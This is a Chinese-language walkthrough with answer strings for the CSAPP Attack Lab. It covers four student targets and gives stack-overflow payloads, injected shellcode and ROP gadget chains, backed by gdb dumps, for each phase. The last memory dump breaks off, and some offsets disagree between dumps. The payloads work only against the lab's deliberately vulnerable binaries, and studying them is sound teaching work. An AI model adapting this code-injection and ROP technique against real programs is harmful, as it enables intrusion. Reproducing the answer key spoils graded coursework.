# 实验环境
虚拟机:VMware Workstation17
系统镜像: ubuntu-18.04.5-desktop-amd64.iso
**注意 ：根据参考文献可知[CSAPP - Attack Lab 详解](https://jkup64.github.io/2023/06/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l3-attacklab/index.html) ， 在 WSL2 和 VMware 中的 Ubuntu22.04 无法进行本实验**
GCC环境(gcc version):gcc (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
GBD : GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1
vim版本 8.2.2121
实验包:target ******.tar
# 实验准备
下载实验包 : target ******.tar

对实验包进行解压

解压命令解析:
```
tar -xvf target ******.tar
-xvf 
x – 解压文件
v – 显示进度
f – 文件名
后面接着的是需要解压文件(压缩包)的名字
```
# 大富翁
只讲大致流程和答案
## 101
### phase1

```c
00000000004017bb <getbuf>:
  4017bb:	48 83 ec 38          	sub    $0x38,%rsp
  4017bf:	48 89 e7             	mov    %rsp,%rdi
  4017c2:	e8 94 02 00 00       	callq  401a5b <Gets>
  4017c7:	b8 01 00 00 00       	mov    $0x1,%eax
  4017cc:	48 83 c4 38          	add    $0x38,%rsp
  4017d0:	c3                   	retq   
```
注意到栈空间为 0x38 字节，填充56个字节垃圾信息后跟上touch1()函数首地址：00000000004017d1

**答案**：
```txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
d1 17 40 00 00 00 00 00
```


### phase2

注入代码：
```txt
inject_code.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	bf 9f fe 85 73       	mov    $0x7385fe9f,%edi
   5:	c3                   	retq    
```

调试得到栈顶地址(注入代码地址)：0x5560a898
```c
(gdb) x/80xb $rsp
0x5560a898:     0xbf    0x9f    0xfe    0x85    0x73    0xc3    0x00    0x00
0x5560a8a0:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5560a8a8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5560a8b0:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5560a8b8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5560a8c0:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5560a8c8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5560a8d0:     0xff    0x17    0x40    0x00    0x00    0x00    0x00    0x00
0x5560a8d8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5560a8e0:     0x72    0x1f    0x40    0x00    0x00    0x00    0x00    0x00
```
**答案：**
```txt
bf 9f fe 85 73 c3 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
98 a8 60 55 00 00 00 00
ff 17 40 00 00 00 00 00
```

### phase3

cookie(去掉前缀0x)当字符串转ASCLL码``37 33 38 35 66 65 39 66``


注入代码：
```txt
inject_code2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	5f                   	pop    %rdi
   1:	c3                   	retq   
```

调试得到栈顶地址(注入代码地址)：0x5560a898
```c
(gdb) x/80xb $rsp
0x5560a898:     0x5f    0xc3    0x00    0x00    0x00    0x00    0x00    0x00
0x5560a8a0:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5560a8a8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5560a8b0:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5560a8b8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5560a8c0:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5560a8c8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5560a8d0:     0x98    0xa8    0x60    0x55    0x00    0x00    0x00    0x00
0x5560a8d8:     0x37    0x33    0x38    0x35    0x66    0x65    0x39    0x66
0x5560a8e0:     0x16    0x19    0x40    0x00    0x00    0x00    0x00    0x00
```
调整后字符串地址为0x5560a8e8 ， 所以pop取出的地址也为0x5560a8e8（字符串地址）
```c
(gdb) x/96xb $rsp
0x5560a898:     0x5f    0xc3    0x00    0x00    0x00    0x00    0x00    0x00
0x5560a8a0:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5560a8a8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5560a8b0:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5560a8b8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5560a8c0:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5560a8c8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5560a8d0:     0x98    0xa8    0x60    0x55    0x00    0x00    0x00    0x00
0x5560a8d8:     0xe0    0xa8    0x60    0x55    0x00    0x00    0x00    0x00
0x5560a8e0:     0x16    0x19    0x40    0x00    0x00    0x00    0x00    0x00
0x5560a8e8:     0x37    0x33    0x38    0x35    0x66    0x65    0x39    0x66
0x5560a8f0:     0x00    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
```
**答案：**
```txt
5f c3 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
98 a8 60 55 00 00 00 00
e8 a8 60 55 00 00 00 00
16 19 40 00 00 00 00 00
37 33 38 35 66 65 39 66
```

### phase4 
注入代码(每行在后面加个ret (c3)):
```c
inject_code.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	58                   	pop    %rax
   1:	89 c7                	mov    %eax,%edi
```

在farm.c的反汇编代码里里面找得到：

4019cf:58 c3  pop    %rax  ret:
```c
00000000004019cc <setval_273>:
  4019cc:	c7 07 ef 58 c3 e1    	movl   $0xe1c358ef,(%rdi)
  4019d2:	c3 
```
4019c8:	89 c7 90 c3               	mov    %eax,%edi nop ret
```c
00000000004019c6 <getval_483>:
  4019c6:	b8 48 89 c7 90       	mov    $0x90c78948,%eax
  4019cb:	c3  
```

先调用 4019cf 地址下的 pop    %rax 取出栈里下一行的cookie ， 然后ret返回
再调用 4019c8 地址下的 mov    %eax,%edi 将cookie值传入寄存器edi中 ，nop 是不做任何操作 ， 然后ret返回
最后调用touch2()函数完成攻击。

答案就是:
```txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
cf 19 40 00 00 00 00 00
9f ef 85 73 00 00 00 00
c8 19 40 00 00 00 00 00
d1 17 40 00 00 00 00 00
```

### phase5
确定最终目标:
```c
mov <字符串地址>  , %rdi
```
因为加上了栈随机，所以可以根据栈顶地址玩偏移。
现成的偏移函数:
```c
00000000004019f4 <add_xy>:
  4019f4:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019f8:	c3                   	retq  
```

所以现在要的目标为:
```c
mov %rsp,%rdi // 找到了
mov <偏移量>,%rsi
call 4019f4 <add_xy>
mov %rax,%rdi  // 找到了
<cooki字符串>
```

先找出可能有用的汇编代码:
```c
4019bb:48 89 c7 91 c3 movq %rax,%rdi , xchg %eax,%ecx , ret
4019c1:58 92 90 90 c3 pop %rax, XCHG   %edx,%eax , ret
4019c7:48 89 c7 90 movq %rax,%rdi,ret
4019cf:58 c3 pop %rax , ret
4019fc:89 c1 90 c3 movl %eax,%ecx , ret
401a2a:48 89 e0 c3 mov %rsp,%rax ,ret
401a2b:89 e0 c3 movl %esp,%eax ,ret
401a5e:89 d6 90 c3 movl %edx,%esi
```
组合一下
```c
401a2a:48 89 e0 c3 mov %rsp,%rax ,ret
4019c7:48 89 c7 90 movq %rax,%rdi,ret
4019cf:58 c3 pop %rax , ret
<偏移量>
4019c2:92 90 90 c3 XCHG   %edx,%eax
401a5e:89 d6 90 c3 movl %edx,%esi
call 4019f4 <add_xy>
4019c7:48 89 c7 90 movq %rax,%rdi,ret
```
动态调试得到<偏移量>为:0x7ffffffe9c08 - 0x7ffffffe9bc0 = 0x40
```c
(gdb) x/80xb $rax
0x7ffffffe9bc0: 0xc7    0x19    0x40    0x00    0x00    0x00    0x00    0x00
0x7ffffffe9bc8: 0xcf    0x19    0x40    0x00    0x00    0x00    0x00    0x00
0x7ffffffe9bd0: 0x48    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7ffffffe9bd8: 0xc2    0x19    0x40    0x00    0x00    0x00    0x00    0x00
0x7ffffffe9be0: 0x5e    0x1a    0x40    0x00    0x00    0x00    0x00    0x00
0x7ffffffe9be8: 0xf4    0x19    0x40    0x00    0x00    0x00    0x00    0x00
0x7ffffffe9bf0: 0xc7    0x19    0x40    0x00    0x00    0x00    0x00    0x00
0x7ffffffe9bf8: 0x16    0x19    0x40    0x00    0x00    0x00    0x00    0x00
0x7ffffffe9c00: 0x37    0x33    0x38    0x35    0x66    0x65    0x39    0x66
0x7ffffffe9c08: 0x00    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
```

所以答案就是
```txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
2a 1a 40 00 00 00 00 00
c7 19 40 00 00 00 00 00
cf 19 40 00 00 00 00 00
40 00 00 00 00 00 00 00
c2 19 40 00 00 00 00 00
5e 1a 40 00 00 00 00 00
f4 19 40 00 00 00 00 00
c7 19 40 00 00 00 00 00
16 19 40 00 00 00 00 00
37 33 38 35 66 65 39 66
```

## 102
### phase1

```c
00000000004017b5 <getbuf>:
  4017b5:	48 83 ec 18          	sub    $0x18,%rsp
  4017b9:	48 89 e7             	mov    %rsp,%rdi
  4017bc:	e8 94 02 00 00       	callq  401a55 <Gets>
  4017c1:	b8 01 00 00 00       	mov    $0x1,%eax
  4017c6:	48 83 c4 18          	add    $0x18,%rsp
  4017ca:	c3                   	retq  
```
注意到栈空间为 0x18 字节，填充24个字节垃圾信息后跟上touch1()函数首地址：00000000004017cb

**答案**：
```txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
cb 17 40 00 00 00 00 00
```


### phase2

注入代码：
```txt

inject_code.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	bf 80 2d e5 21       	mov    $0x21e52d80,%edi
   5:	c3                   	retq       
```

调试得到栈顶地址(注入代码地址)：0x5565d3a8
```c
(gdb) x/80xb $rsp
0x5565d3a8:     0xbf    0x80    0x2d    0xe5    0x21    0xc3    0x00    0x00
0x5565d3b0:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5565d3b8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5565d3c0:     0xf9    0x17    0x40    0x00    0x00    0x00    0x00    0x00
0x5565d3c8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5565d3d0:     0x6c    0x1f    0x40    0x00    0x00    0x00    0x00    0x00
0x5565d3d8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5565d3e0:     0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
0x5565d3e8:     0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
0x5565d3f0:     0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
```
**答案：**
```txt
bf 80 2d e5 21 c3 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
a8 d3 65 55 00 00 00 00
f9 17 40 00 00 00 00 00
```

### phase3

cookie(去掉前缀0x)当字符串转ASCLL码``32 31 65 35 32 64 38 30``


注入代码：
```txt
inject_code2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	5f                   	pop    %rdi
   1:	c3                   	retq   
```

栈顶地址不变还是(注入代码地址)：0x5565d3a8
通过计算偏移量得到注入的cookie字符串地址为:0x5565d3d8
**答案：**
```txt
5f c3 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
a8 d3 65 55 00 00 00 00
d8 d3 65 55 00 00 00 00
10 19 40 00 00 00 00 00
32 31 65 35 32 64 38 30
```

### phase4 
注入代码(每行在后面加个ret (c3)):
```c
inject_code.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	58                   	pop    %rax
   1:	89 c7                	mov    %eax,%edi
```

在farm.c的反汇编代码里里面找得到：

4019bd:58 c3  pop    %rax  ret:
```c
00000000004019ba <addval_399>:
  4019ba:	8d 87 f6 58 90 90    	lea    -0x6f6fa70a(%rdi),%eax
  4019c0:	c3                   	retq   
```
4019dc:48	89 c7 90 c3               	mov    %rax,%rdi ret
```c
00000000004019da <setval_442>:
  4019da:	c7 07 48 89 c7 c3    	movl   $0xc3c78948,(%rdi)
  4019e0:	c3     
```

先调用 4019bd 地址下的 pop    %rax 取出栈里下一行的cookie ， 然后ret返回
再调用 4019dc 地址下的 mov    %rax,%rdi 将cookie值传入寄存器rdi中 ， 然后ret返回
最后调用touch2()函数完成攻击。

答案就是:
```txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
bd 19 40 00 00 00 00 00
80 2d e5 21 00 00 00 00
dc 19 40 00 00 00 00 00
f9 17 40 00 00 00 00 00
```

### phase5
确定最终目标:
```c
mov <字符串地址>  , %rdi
```
因为加上了栈随机，所以可以根据栈顶地址玩偏移。
现成的偏移函数:
```c
00000000004019ed <add_xy>:
  4019ed:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019f1:	c3                   	retq   
```

所以现在要的目标为:
```c
mov %rsp,%rdi // 找到了
mov <偏移量>,%rsi
call 4019ed <add_xy>
mov %rax,%rdi  // 找到了
<cooki字符串>
```

先找出可能有用的汇编代码:
```c
401a22:89 ce c3 movl %ecx,%esi
401a82:89 d1 c3 movl %edx,%ecx
401a3e:48 89 e0 c3 mov %rsp,%rax ,ret
4019e2:48 89 c7 90 movq %rax,%rdi,ret
4019bd:58 c3 pop %rax , ret
4019b8:92 c3 XCHG   %edx,%eax
4019e2:48 89 c7 90 movq %rax,%rdi,ret
```
组合一下
```c
401a3e:48 89 e0 c3 mov %rsp,%rax ,ret
4019e2:48 89 c7 90 movq %rax,%rdi,ret
4019bd:58 c3 pop %rax , ret
<偏移量>
4019b8:92 c3 XCHG   %edx,%eax
401a82:89 d1 c3 movl %edx,%ecx
401a22:89 ce c3 movl %ecx,%esi
call 4019ed <add_xy>
4019e2:48 89 c7 90 movq %rax,%rdi,ret
```
动态调试得到<偏移量>为:0x7fffffffa3a8 - 0x7fffffffa360 = 0x48
```c
(gdb) x/96xb $rax
0x7fffffffa360: 0xe2    0x19    0x40    0x00    0x00    0x00    0x00    0x00
0x7fffffffa368: 0xbd    0x19    0x40    0x00    0x00    0x00    0x00    0x00
0x7fffffffa370: 0x50    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffa378: 0xb8    0x19    0x40    0x00    0x00    0x00    0x00    0x00
0x7fffffffa380: 0x82    0x1a    0x40    0x00    0x00    0x00    0x00    0x00
0x7fffffffa388: 0x22    0x1a    0x40    0x00    0x00    0x00    0x00    0x00
0x7fffffffa390: 0xed    0x19    0x40    0x00    0x00    0x00    0x00    0x00
0x7fffffffa398: 0xe2    0x19    0x40    0x00    0x00    0x00    0x00    0x00
0x7fffffffa3a0: 0x10    0x19    0x40    0x00    0x00    0x00    0x00    0x00
0x7fffffffa3a8: 0x32    0x31    0x65    0x35    0x32    0x64    0x38    0x30
0x7fffffffa3b0: 0x00    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
0x7fffffffa3b8: 0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
```

所以答案就是
```txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
3e 1a 40 00 00 00 00 00
e2 19 40 00 00 00 00 00
bd 19 40 00 00 00 00 00
48 00 00 00 00 00 00 00
b8 19 40 00 00 00 00 00
82 1a 40 00 00 00 00 00
22 1a 40 00 00 00 00 00
ed 19 40 00 00 00 00 00
e2 19 40 00 00 00 00 00
10 19 40 00 00 00 00 00
32 31 65 35 32 64 38 30
```

## 103
### phase1

```c
0000000000401833 <getbuf>:
  401833:	48 83 ec 28          	sub    $0x28,%rsp
  401837:	48 89 e7             	mov    %rsp,%rdi
  40183a:	e8 94 02 00 00       	callq  401ad3 <Gets>
  40183f:	b8 01 00 00 00       	mov    $0x1,%eax
  401844:	48 83 c4 28          	add    $0x28,%rsp
  401848:	c3                   	retq   
```
注意到栈空间为 0x28 字节，填充40个字节垃圾信息后跟上touch1()函数首地址：0000000000401849

**答案**：
```txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
49 18 40 00 00 00 00 00
```

### phase2

注入代码：
```txt
inject_code2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	bf 34 62 8d 4f       	mov    $0x4f8d6234,%edi
   5:	c3                   	retq   
```

调试得到栈顶地址(注入代码地址)：0x556846e8
```c
(gdb) x/80xb $rsp
0x556846e8:     0xbf    0x34    0x62    0x8d    0x4f    0xc3    0x00    0x00
0x556846f0:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x556846f8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x55684700:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x55684708:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x55684710:     0xe8    0x46    0x68    0x55    0x00    0x00    0x00    0x00
0x55684718:     0x77    0x18    0x40    0x00    0x00    0x00    0x00    0x00
0x55684720:     0x00    0x1f    0x40    0x00    0x00    0x00    0x00    0x00
0x55684728:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x55684730:     0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
```
**答案：**
```txt
bf 34 62 8d 4f c3 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
e8 46 68 55 00 00 00 00
77 18 40 00 00 00 00 00
```

### phase3

cookie(去掉前缀0x)当字符串转ASCLL码``34 66 38 64 36 32 33 34``


注入代码：
```txt
inject_code2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	5f                   	pop    %rdi
   1:	c3                   	retq   
```

调试得到栈顶地址(注入代码地址)：0x556846e8
```c
(gdb) x/80xb $rsp
0x556846e8:     0x5f    0xc3    0x00    0x00    0x00    0x00    0x00    0x00
0x556846f0:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x556846f8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x55684700:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x55684708:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x55684710:     0xe8    0x46    0x68    0x55    0x00    0x00    0x00    0x00
0x55684718:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x55684720:     0x8e    0x19    0x40    0x00    0x00    0x00    0x00    0x00
0x55684728:     0x34    0x66    0x38    0x64    0x36    0x32    0x33    0x34
0x55684730:     0x00    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
```
调整后字符串地址为0x55684728 ， 所以pop取出的地址也为0x55684728（字符串地址）
**答案：**
```txt
5f c3 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
e8 46 68 55 00 00 00 00
28 47 68 55 00 00 00 00
8e 19 40 00 00 00 00 00
34 66 38 64 36 32 33 34
```

注入代码也可以是:
```txt

inject_code2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	bf 20 47 68 55       	mov    $0x55684720,%edi
   5:	c3                   	retq   
```
**答案2：**
```txt
bf 20 47 68 55 c3 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
e8 46 68 55 00 00 00 00
8e 19 40 00 00 00 00 00
34 66 38 64 36 32 33 34
```


### phase4 
注入代码(每行在后面加个ret (c3)):
```c
inject_code.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	58                   	pop    %rax
   1:	89 c7                	mov    %eax,%edi
```

在farm.c的反汇编代码里里面找得到：

401a48:58 c3  pop    %rax  ret:
```c
0000000000401a46 <setval_468>:
  401a46:	c7 07 58 90 90 c3    	movl   $0xc3909058,(%rdi)
  401a4c:	c3 
```
401a56:48 89 c7 90 c3               	mov    %rax,%rdi nop ret
```c
0000000000401a54 <addval_278>:
  401a54:	8d 87 48 89 c7 90    	lea    -0x6f3876b8(%rdi),%eax
  401a5a:	c3   
```

先调用 401a48 地址下的 pop    %rax 取出栈里下一行的cookie ， 然后ret返回
再调用 401a56 地址下的 mov    %rax,%rdi 将cookie值传入寄存器edi中 ，nop 是不做任何操作 ， 然后ret返回
最后调用touch2()函数完成攻击。

答案就是:
```txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
48 1a 40 00 00 00 00 00
34 62 8d 4f 00 00 00 00
56 1a 40 00 00 00 00 00
77 18 40 00 00 00 00 00
```

### phase5
确定最终目标:
```c
mov <字符串地址>  , %rdi
```
因为加上了栈随机，所以可以根据栈顶地址玩偏移。
现成的偏移函数:
```c
0000000000401a6f <add_xy>:
  401a6f:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  401a73:	c3 
```

所以现在要的目标为:
```c
mov %rsp,%rdi // 找到了
mov <偏移量>,%rsi
call 401a6f <add_xy>
mov %rax,%rdi  // 找到了
<cooki字符串>
```

先找出可能有用的汇编代码:
```c
401ac6:48 89 e0 c3 mov %rsp,%rax ,ret
401a56:48 89 c7 90 movq %rax,%rdi,ret
401a5d:58 c3 pop %rax , ret
401aa1:96 XCHG   %esi,%eax
401a56:48 89 c7 90 movq %rax,%rdi,ret
```
组合一下
```c
401ac6:48 89 e0 c3 mov %rsp,%rax ,ret
401a56:48 89 c7 90 movq %rax,%rdi,ret
401a5d:58 c3 pop %rax , ret
<偏移量>
401aa1:96 XCHG   %esi,%eax
call 401a6f <add_xy>
401a56:48 89 c7 90 movq %rax,%rdi,ret
```
计算<偏移量>为38

所以答案就是
```txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c6 1a 40 00 00 00 00 00
56 1a 40 00 00 00 00 00
5d 1a 40 00 00 00 00 00
38 00 00 00 00 00 00 00
a1 1a 40 00 00 00 00 00
6f 1a 40 00 00 00 00 00
56 1a 40 00 00 00 00 00
8e 19 40 00 00 00 00 00
34 66 38 64 36 32 33 34
```


## 104
### phase1

```c
00000000004018a2 <getbuf>:
  4018a2:	48 83 ec 38          	sub    $0x38,%rsp
  4018a6:	48 89 e7             	mov    %rsp,%rdi
  4018a9:	e8 94 02 00 00       	callq  401b42 <Gets>
  4018ae:	b8 01 00 00 00       	mov    $0x1,%eax
  4018b3:	48 83 c4 38          	add    $0x38,%rsp
  4018b7:	c3                   	retq  
```
注意到栈空间为 0x38 字节，填充56个字节垃圾信息后跟上touch1()函数首地址：00000000004018b8

**答案**：
```txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
b8 18 40 00 00 00 00 00
```


### phase2

注入代码：
```txt
inject_code.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	bf f0 10 75 7d       	mov    $0x7d7510f0,%edi
   5:	c3                   	retq      
```

调试得到栈顶地址(注入代码地址)：0x55685a38
```c
(gdb) x/80xb $rsp
0x55685a38:     0xbf    0xf0    0x10    0x75    0x7d    0xc3    0x00    0x00
0x55685a40:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x55685a48:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x55685a50:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x55685a58:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x55685a60:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x55685a68:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x55685a70:     0xe6    0x18    0x40    0x00    0x00    0x00    0x00    0x00
0x55685a78:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x55685a80:     0x59    0x20    0x40    0x00    0x00    0x00    0x00    0x00
```
**答案：**
```txt
bf f0 10 75 7d c3 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
38 5a 68 55 00 00 00 00
e6 18 40 00 00 00 00 00
```

### phase3

cookie(去掉前缀0x)当字符串转ASCLL码``37 64 37 35 31 30 66 30``


注入代码：
```txt
inject_code2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	5f                   	pop    %rdi
   1:	c3                   	retq   
```

栈顶地址不变还是(注入代码地址)：0x55685a38
通过计算偏移量得到注入的cookie字符串地址为:0x55685a88
**答案：**
```txt
5f c3 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
38 5a 68 55 00 00 00 00
88 5a 68 55 00 00 00 00
fd 19 40 00 00 00 00 00
37 64 37 35 31 30 66 30
```

### phase4 
注入代码(每行在后面加个ret (c3)):
```c
inject_code.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	58                   	pop    %rax
   1:	89 c7                	mov    %eax,%edi
```

在farm.c的反汇编代码里里面找得到：

401ac9:58 c3  pop    %rax  ret:
```c
0000000000401ac7 <addval_483>:
  401ac7:	8d 87 58 90 90 c3    	lea    -0x3c6f6fa8(%rdi),%eax
  401acd:	c3                   	retq   
```
401abb:48	89 c7 90 c3               	mov    %rax,%rdi ret
```c
0000000000401ab9 <setval_246>:
  401ab9:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  401abf:	c3      
```

先调用 401ac9 地址下的 pop    %rax 取出栈里下一行的cookie ， 然后ret返回
再调用 401abb 地址下的 mov    %rax,%rdi 将cookie值传入寄存器rdi中 ， 然后ret返回
最后调用touch2()函数完成攻击。

答案就是:
```txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c9 1a 40 00 00 00 00 00
f0 10 75 7d 00 00 00 00
bb 1a 40 00 00 00 00 00
e6 18 40 00 00 00 00 00
```

### phase5
确定最终目标:
```c
mov <字符串地址>  , %rdi
```
因为加上了栈随机，所以可以根据栈顶地址玩偏移。
现成的偏移函数:
```c
0000000000401adb <add_xy>:
  401adb:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  401adf:	c3                   	retq     
```

所以现在要的目标为:
```c
mov %rsp,%rdi // 找到了
mov <偏移量>,%rsi
call 401adb <add_xy>
mov %rax,%rdi  // 找到了
<cooki字符串>
```

先找出可能有用的汇编代码:
```c
401b3a:48 89 e0 c3 mov %rsp,%rax ,ret
401aaf:48 89 c7 90 movq %rax,%rdi,ret
401aa3:58 c3 pop %rax , ret
401b51:92 c3 XCHG   %edx,%eax
401bb6:89 d6 c3 movl %edx,%esi
401aaf:48 89 c7 90 movq %rax,%rdi,ret
```
组合一下
```c
401b3a:48 89 e0 c3 mov %rsp,%rax ,ret
401aaf:48 89 c7 90 movq %rax,%rdi,ret
401aa3:58 c3 pop %rax , ret
<偏移量>
401b51:92 c3 XCHG   %edx,%eax
401bb6:89 d6 c3 movl %edx,%esi
call 401adb <add_xy>
401aaf:48 89 c7 90 movq %rax,%rdi,ret
```
动态调试得到<偏移量>为:0x7ffffff931a0 - 0x7ffffff93160 = 0x40
```c                                                                                                                                  
0x7ffffff93160: 0xaf    0x1a    0x40    0x00    0x00    0x00    0x00    0x00
0x7ffffff93168: 0xa3    0x1a    0x40    0x00    0x00    0x00    0x00    0x00
0x7ffffff93170: 0x48    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7ffffff93178: 0x51    0x1b    0x40    0x00    0x00    0x00    0x00    0x00
0x7ffffff93180: 0xb6    0x1b    0x40    0x00    0x00    0x00    0x00    0x00
0x7ffffff93188: 0xdb    0x1a    0x40    0x00    0x00    0x00    0x00    0x00
